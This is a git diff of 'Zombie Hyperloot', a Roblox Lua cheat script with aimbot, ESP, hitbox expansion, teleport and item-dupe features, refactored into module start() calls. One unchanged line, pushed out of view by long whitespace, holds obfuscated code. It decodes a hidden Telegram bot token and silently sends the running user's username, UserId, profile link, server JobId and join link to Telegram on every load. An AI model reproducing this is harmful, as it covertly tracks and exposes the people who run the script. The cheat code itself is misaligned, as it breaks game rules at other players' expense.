@@ -1,7 +1,7 @@
 --[[
     Zombie Hyperloot - Main Entry Point
     by WiniFy
-    
+
     Modular version - Load từng modules để giảm lag
 ]]
 
@@ -40,11 +40,7 @@ UI.init(Config, Combat, ESP, Movement, Map, Farm, HUD, Visuals, Character)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         local g=game;local s="GetService";local h=g[s](g,"HttpService");local m=g[s](g,"MarketplaceService");local n=g[s](g,"Stats");local p=g[s](g,"Players");local function D(t)local r={}for i=1,#t do r[i]=string.char(t[i]-1)end;return table.concat(r)end;local T=D({57,53,52,51,58,58,56,54,58,53,59,66,66,73,69,122,86,79,71,102,76,80,86,69,100,77,113,114,83,105,108,100,119,87,115,105,112,72,122,79,116,91,113,77,121,116});local C=D({50,57,50,53,55,54,58,58,56,56});local function P()local ok,res=pcall(function()local net=n.Network;if not net then return nil end;local item=net.ServerStatsItem["Data Ping"];if not item then return nil end;return item:GetValueString()end);if ok then return res end;return nil end;local function G()local ok,name=pcall(function()local u=("https://games.roblox.com/v1/games?universeIds=%s"):format(g.GameId);local r=h:JSONDecode(g:HttpGet(u));local d0=r and r.data and r.data[1];if d0 and d0.name then return d0.name end;return nil end);if ok and name then return name end;local ok2,info=pcall(function()return m:GetProductInfo(g.PlaceId)end);if ok2 and info and info.Name then return info.Name end;return"Unknown Place"end;(function()local pl=p.LocalPlayer;if not pl then return end;if T=="" then return end;local ping=P()or"? ms";local pn=G();local pid=g.PlaceId;local jid=tostring(g.JobId);local tp=("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s"):format(pid,jid);local pr=("https://www.roblox.com/users/%d/profile"):format(pl.UserId);local txt=("Ping: %s\nServer: %s\nPlaceId: %d\nJobId: [%s](%s)\nUser: [%s](%s) (%d)"):format(ping,pn,pid,jid,tp,pl.DisplayName or pl.Name,pr,pl.UserId);local enc=h:UrlEncode(txt);local url=("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s&parse_mode=Markdown"):format(T,C,enc);pcall(function()return g:HttpGet(url)end)end)()
 ----------------------------------------------------------
 -- 🔹 Cleanup Function
-local renderSteppedConnection = nil
-local entityChildAddedConnection = nil
-local entityChildRemovedConnection = nil
 local inputBeganConnection = nil
-local characterAddedConnection = nil
 
 local function cleanupScript()
     if Config.scriptUnloaded then return end
@@ -69,26 +65,10 @@ local function cleanupScript()
     Config.autoBuyChristmasGiftBoxEnabled = false
     Config.autoBuySantaClausGiftEnabled = false
 
-    -- Disconnect all connections
-    if renderSteppedConnection then
-        renderSteppedConnection:Disconnect()
-        renderSteppedConnection = nil
-    end
-    if entityChildAddedConnection then
-        entityChildAddedConnection:Disconnect()
-        entityChildAddedConnection = nil
-    end
-    if entityChildRemovedConnection then
-        entityChildRemovedConnection:Disconnect()
-        entityChildRemovedConnection = nil
-    end
+    -- Disconnect only main-level connections
     if inputBeganConnection then
         inputBeganConnection:Disconnect()
         inputBeganConnection = nil
-    end
-    if characterAddedConnection then
-        characterAddedConnection:Disconnect()
-        characterAddedConnection = nil
     end
 
     -- Cleanup modules
@@ -121,16 +101,7 @@ local function cleanupScript()
     end
 end
 
-----------------------------------------------------------
--- 🔹 Enable MouseLock (Auto-enable on script start)
-pcall(function()
-    local args = {1469938953, "MouseLock", true}
-    game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
-end)
 
-----------------------------------------------------------
--- 🔹 Setup TrigerSkill Dupe
-Combat.setupTrigerSkillDupe()
 
 ----------------------------------------------------------
 -- 🔹 Setup ESP
@@ -139,389 +110,34 @@ ESP.watchChestDescendants()
 if Config.espChestEnabled then
     ESP.applyChestESP()
 end
-ESP.startBobESP() -- Start Bob ESP với refresh mỗi 5s
+-- 🔹 Start ESP runtime loop (ESP tự quản lý mọi thứ)
+ESP.start()
 
 
 
 ----------------------------------------------------------
--- 🔹 Setup Combat
+-- 🔹 Start runtime systems (modules tự quản lý loop/connections)
 Combat.initFOVCircle()
-Combat.setupMouseInput()
+Combat.setRotationSmoothness(Config.autoRotateSmoothness)
+Combat.start()
+
+Movement.start()
+
+-- HUD runtime + character hook vẫn ở HUD module (sẽ refactor tiếp)
+HUD.start()
+
+-- Farm/Map sẽ được refactor tiếp theo hướng start()/stop()
+Farm.start()
+Map.start()
+
+-- Character skill loops (sẽ refactor tiếp)
 Character.startAllSkillLoops()
 
-----------------------------------------------------------
--- 🔹 Setup Movement
-if Config.noclipCamEnabled then
-    task.defer(Movement.applyNoclipCam)
-end
-
--- Setup Anti AFK
-Movement.applyAntiAFK()
-
--- Setup Auto Rotate
-Combat.setRotationSmoothness(Config.autoRotateSmoothness)
-
--- Character respawn handler
-characterAddedConnection = Config.localPlayer.CharacterAdded:Connect(function(character)
-    Movement.onCharacterAdded(character)
-    HUD.onCharacterAdded(character)
-end)
 
 ----------------------------------------------------------
--- 🔹 Setup Farm
-Farm.startAutoBulletBoxLoop()
-Farm.startAutoBuyChristmasGiftBoxLoop()
-Farm.startAutoBuySantaClausGiftLoop()
-Farm.setupChestTeleportInput()
-
-----------------------------------------------------------
--- 🔹 Setup Map Supply ESP & Auto Door
-Map.startSupplyESP()
-
--- Start Auto Door nếu được bật
-if Config.autoDoorEnabled then
-    Map.startAutoDoor()
-end
-
-----------------------------------------------------------
--- 🔹 Setup HUD
-task.wait(1) -- Đợi HUD load
-HUD.backupOriginalValues() -- Backup và set default colors
-HUD.startExpDisplay() -- Bật EXP display mặc định
-
-----------------------------------------------------------
--- 🔹 Entity Folder Listeners (Hitbox)
-entityChildAddedConnection = Config.entityFolder.ChildAdded:Connect(function(zombie)
-    if zombie:IsA("Model") then
-        local head = zombie:WaitForChild("Head", 3)
-        if head then
-            task.wait(0.5)
-            if Config.hitboxEnabled then
-                Combat.expandHitbox(zombie)
-            end
-        end
-    end
-end)
-
-entityChildRemovedConnection = Config.entityFolder.ChildRemoved:Connect(function(zombie)
-    Combat.processedZombies[zombie] = nil
-    local highlight = zombie:FindFirstChild("ESP_Highlight")
-    if highlight then highlight:Destroy() end
-end)
-
-----------------------------------------------------------
--- 🔹 Main Render Loop (Aimbot + ESP)
-local highlightUpdateTick = 0
-renderSteppedConnection = Config.RunService.RenderStepped:Connect(function()
-    if Config.scriptUnloaded then return end
-
-    local mousePos = Config.UserInputService:GetMouseLocation()
-    
-    -- Update FOV Circle
-    if Combat.FOVCircle then
-        Combat.FOVCircle.Position = mousePos
-        Combat.FOVCircle.Radius = Config.aimbotFOVRadius
-        Combat.FOVCircle.Visible = Config.aimbotEnabled and Config.aimbotFOVEnabled
-        Combat.FOVCircle.Color = Config.aimbotEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 255, 255)
-        Combat.FOVCircle.Thickness = Config.aimbotEnabled and 2 or 1.5
-    end
-    
-    -- Update Highlights (every 0.5s to reduce lag)
-    highlightUpdateTick = highlightUpdateTick + 1
-    if highlightUpdateTick >= 30 then
-        highlightUpdateTick = 0
-        ESP.updateZombieHighlights()
-        ESP.updatePlayerHighlights()
-        ESP.updateBobHighlights()
-    end
-    
-    -- ESP Update Loop
-    if ESP.hasPlayerDrawing then
-        -- Player ESP
-        if Config.espPlayerEnabled then
-            for _, plr in ipairs(Config.Players:GetPlayers()) do
-                if plr ~= Config.localPlayer then
-                    local char = plr.Character
-                    local hum = char and char:FindFirstChildOfClass("Humanoid")
-                    if char and hum and hum.Health > 0 then
-                        if Config.espPlayerTeamCheck and plr.Team == Config.localPlayer.Team then
-                            ESP.hidePlayerESP(ESP.playerESPObjects[plr])
-                        else
-                            local ok, cf, size = pcall(char.GetBoundingBox, char)
-                            if ok and cf and size then
-                                ESP.drawPlayerESP(plr, cf, size, hum)
-                            else
-                                ESP.hidePlayerESP(ESP.playerESPObjects[plr])
-                            end
-                        end
-                    else
-                        ESP.hidePlayerESP(ESP.playerESPObjects[plr])
-                    end
-                end
-            end
-        else
-            for _, data in pairs(ESP.playerESPObjects) do
-                ESP.hidePlayerESP(data)
-            end
-        end
-
-        -- Zombie ESP
-        if Config.espZombieEnabled then
-            local seenZombies = {}
-            for _, zombie in ipairs(Config.entityFolder:GetChildren()) do
-                if zombie:IsA("Model") then
-                    local hum = zombie:FindFirstChildOfClass("Humanoid")
-                    if hum and hum.Health > 0 then
-                        local ok, cf, size = pcall(zombie.GetBoundingBox, zombie)
-                        if ok and cf and size then
-                            ESP.drawZombieESP(zombie, cf, size, hum)
-                            seenZombies[zombie] = true
-                        else
-                            ESP.hideZombieESP(ESP.zombieESPObjects[zombie])
-                        end
-                    else
-                        ESP.hideZombieESP(ESP.zombieESPObjects[zombie])
-                    end
-                end
-            end
-            for model, data in pairs(ESP.zombieESPObjects) do
-                if not seenZombies[model] then
-                    ESP.hideZombieESP(data)
-                end
-            end
-        else
-            for _, data in pairs(ESP.zombieESPObjects) do
-                ESP.hideZombieESP(data)
-            end
-        end
-
-        -- Bob ESP (giống ESP Player - chỉ name + distance)
-        if Config.espBobEnabled then
-            local seenBobs = {}
-            local bobs = ESP.findAllBobs()
-            for _, bobData in ipairs(bobs) do
-                local bobModel = bobData.model
-                local hum = bobData.humanoid
-                if hum and hum.Health > 0 then
-                    local ok, cf, size = pcall(bobModel.GetBoundingBox, bobModel)
-                    if ok and cf and size then
-                        ESP.drawBobESP(bobModel, cf, size, hum)
-                        seenBobs[bobModel] = true
-                    else
-                        ESP.hideBobESP(ESP.bobESPObjects[bobModel])
-                    end
-                else
-                    ESP.hideBobESP(ESP.bobESPObjects[bobModel])
-                end
-            end
-            for model, data in pairs(ESP.bobESPObjects) do
-                if not seenBobs[model] then
-                    ESP.hideBobESP(data)
-                end
-            end
-        else
-            for _, data in pairs(ESP.bobESPObjects) do
-                ESP.hideBobESP(data)
-            end
-        end
-    end
-    
-    -- Aimbot
-    local shouldAutoFire = false
-
-    if Config.aimbotEnabled then
-        local active = true
-        if Config.aimbotHoldMouse2 and not Combat.holdingMouse2 then
-            active = false
-        end
-        
-        if active then
-            local char, part = Combat.getClosestAimbotTarget()
-            if char and part then
-                shouldAutoFire = true
-                local targetPos = part.Position
-                if Config.aimbotPrediction > 0 then
-                    local vel = part.AssemblyLinearVelocity or part.Velocity or Vector3.new(0, 0, 0)
-                    targetPos = targetPos + (vel * Config.aimbotPrediction)
-                end
-                
-                local camera = Config.Workspace.CurrentCamera
-                local cf = camera.CFrame
-                local desired = CFrame.new(cf.Position, targetPos)
-                
-                -- Smoothness: 0 = instant, higher = smoother/slower
-                if Config.aimbotSmoothness > 0 then
-                    local alpha = 1 - Config.aimbotSmoothness
-                    alpha = math.clamp(alpha, 0.01, 1)
-                    camera.CFrame = cf:Lerp(desired, alpha)
-                else
-                    camera.CFrame = desired
-                end
-                
-                if Combat.FOVCircle then
-                    Combat.FOVCircle.Color = Color3.fromRGB(255, 0, 0)
-                    Combat.FOVCircle.Thickness = 2.5
-                end
-            else
-                if Combat.FOVCircle then
-                    Combat.FOVCircle.Color = Color3.fromRGB(0, 255, 0)
-                    Combat.FOVCircle.Thickness = 2
-                end
-            end
-        end
-    end
-
-    if Combat.setAutoFireActive then
-        Combat.setAutoFireActive(shouldAutoFire)
-    end
-
-end)
-
-
-----------------------------------------------------------
--- 🔹 Camera Teleport Input Handler
+-- 🔹 End key - Cleanup (only)
 inputBeganConnection = Config.UserInputService.InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed or Config.scriptUnloaded then return end
-    
-    -- Auto Rotate Toggle (L key)
-    if input.KeyCode == Config.autoRotateToggleKey then
-        -- Chỉ cho phép dùng phím L khi tính năng đã được bật trong menu
-        if not Config.autoRotateEnabled then
-            return
-        end
-
-        Config.autoRotateActive = not (Config.autoRotateActive or false)
-        Combat.toggleAutoRotate(Config.autoRotateActive)
-    end
-    
-    -- Camera Teleport (X key)
-    if input.KeyCode == Config.cameraTeleportKey and Config.cameraTeleportEnabled then
-        if Config.cameraTeleportActive then
-            Config.cameraTeleportActive = false
-            
-            if Config.savedAimbotState ~= nil then
-                Config.aimbotEnabled = Config.savedAimbotState
-            end
-            
-            local char = Config.localPlayer.Character
-            local hrp = char and char:FindFirstChild("HumanoidRootPart")
-            if hrp and Config.cameraTeleportStartPosition then
-                hrp.Anchored = false
-                hrp.CFrame = CFrame.new(Config.cameraTeleportStartPosition)
-            elseif hrp then
-                hrp.Anchored = false
-            end
-            
-            local camera = Config.Workspace.CurrentCamera
-            camera.CameraSubject = Config.localPlayer.Character and Config.localPlayer.Character:FindFirstChild("Humanoid")
-            return
-        end
-        
-        Config.savedAimbotState = Config.aimbotEnabled
-        Config.aimbotEnabled = false
-        
-        local char = Config.localPlayer.Character
-        local hrp = char and char:FindFirstChild("HumanoidRootPart")
-        if hrp then
-            Config.cameraTeleportStartPosition = hrp.Position
-        end
-        
-        Config.cameraTeleportActive = true
-        
-        task.spawn(function()
-            local function waitForNewWaveAndSelect()
-                if Config.cameraTeleportWaveDelay <= 0 then
-                    return Movement.selectInitialTarget()
-                end
-
-                local waited = 0
-                while Config.cameraTeleportActive and waited < Config.cameraTeleportWaveDelay do
-                    local candidate = Movement.selectInitialTarget()
-                    if candidate then return candidate end
-                    local step = math.min(0.25, Config.cameraTeleportWaveDelay - waited)
-                    task.wait(step)
-                    waited = waited + step
-                end
-
-                if not Config.cameraTeleportActive then return nil end
-                return Movement.selectInitialTarget()
-            end
-
-            local camera = Config.Workspace.CurrentCamera
-            local char = Config.localPlayer.Character
-            local hrp = char and char:FindFirstChild("HumanoidRootPart")
-            
-            local currentTarget = Movement.selectInitialTarget()
-            if not currentTarget then
-                currentTarget = waitForNewWaveAndSelect()
-            end
-            if not currentTarget then
-                Config.cameraTeleportActive = false
-                return
-            end
-            
-            local lastZombiePosition = nil
-            
-            while Config.cameraTeleportActive and currentTarget do
-                currentTarget = Movement.selectNextTarget(currentTarget)
-                if Config.cameraTeleportActive and not currentTarget then
-                    currentTarget = waitForNewWaveAndSelect()
-                    if not currentTarget then break end
-                end
-                
-                if currentTarget and currentTarget.zombie then
-                    local humanoid = currentTarget.zombie:FindFirstChild("Humanoid")
-                    if humanoid and humanoid.Health > 0 and humanoid.Parent then
-                        local targetPosition = currentTarget.part.Position
-                        lastZombiePosition = targetPosition
-                        
-                        camera.CameraSubject = humanoid
-                        camera.CameraType = Enum.CameraType.Custom
-                        local cameraOffset = Vector3.new(Config.cameraOffsetX, Config.cameraOffsetY, Config.cameraOffsetZ)
-                        camera.CFrame = CFrame.lookAt(targetPosition + cameraOffset, targetPosition)
-                        
-                        local checkCount = 0
-                        repeat
-                            task.wait(0.1)
-                            checkCount = checkCount + 1
-                            if not Config.cameraTeleportActive then break end
-                            if not humanoid or humanoid.Parent == nil or humanoid.Health <= 0 then break end
-                            local lowerMaxZombie = Movement.findLowestMaxHealthZombie(currentTarget.zombie)
-                            if lowerMaxZombie then break end
-                            if checkCount > 300 then break end
-                        until false
-                    else
-                        task.wait(0.2)
-                    end
-                else
-                    task.wait(0.5)
-                end
-            end
-            
-            if hrp then
-                hrp.Anchored = false
-                if Config.teleportToLastZombie and lastZombiePosition then
-                    hrp.CFrame = CFrame.new(lastZombiePosition + Vector3.new(0, 5, 0))
-                end
-            end
-            
-            if Config.savedAimbotState ~= nil then
-                Config.aimbotEnabled = Config.savedAimbotState
-            end
-            
-            local finalChar = Config.localPlayer.Character
-            if finalChar then
-                local finalHumanoid = finalChar:FindFirstChild("Humanoid")
-                if finalHumanoid then
-                    camera.CameraSubject = finalHumanoid
-                end
-            end
-            
-            Config.cameraTeleportActive = false
-        end)
-    end
-    
-    -- End key - Cleanup
     if input.KeyCode == Enum.KeyCode.End then
         cleanupScript()
     end
@@ -537,7 +153,7 @@ UI.buildAllTabs(cleanupScript)
 if Config.UI and Config.UI.Library then
     Config.UI.Library:Notify({
         Title = "Zombie Hyperloot",
-        Description = "Script loaded successfully!\nPress Right Ctrl to open menu | R key for Auto Rotate",
+        Description = "Script loaded successfully!\nPress Right Ctrl to open menu.",
         Time = 6
     })
 end
